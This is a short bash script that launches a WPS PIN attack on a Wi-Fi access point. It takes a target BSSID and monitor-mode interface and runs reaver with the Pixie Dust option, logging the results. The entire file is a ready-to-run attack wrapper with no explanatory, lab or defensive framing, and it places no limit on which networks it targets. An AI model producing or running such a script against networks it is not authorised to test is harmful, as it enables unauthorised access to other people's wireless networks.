#!/bin/bash
# WPS PIN attack
BSSID="${1:?Usage: $0 <BSSID> <interface>}"
IFACE="${2:-wlan0mon}"

echo "[*] Starting WPS attack on $BSSID"
reaver -i "$IFACE" -b "$BSSID" -vv -K 1 -o "reaver-${BSSID//:/}.log"
